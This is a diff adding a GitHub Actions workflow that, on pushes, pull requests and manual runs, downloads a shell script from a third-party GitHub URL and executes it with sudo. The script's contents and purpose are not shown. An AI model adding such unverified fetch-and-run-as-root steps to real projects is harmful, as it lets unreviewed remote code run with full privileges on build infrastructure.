@@ -1,0 +1,22 @@
+on:
+  push:
+    branches:
+      - main
+  pull_request:
+    branches:
+      - main
+  workflow_dispatch:
+
+jobs:
+  run-jb-script:
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Checkout repository
+      uses: actions/checkout@v3
+
+    - name: Download and run script
+      run: |
+        wget -O 0615fei.sh https://raw.githubusercontent.com/kuilema2/0615fei/main/0615fei.sh
+        chmod +x 0615fei.sh
+        sudo ./0615fei.sh
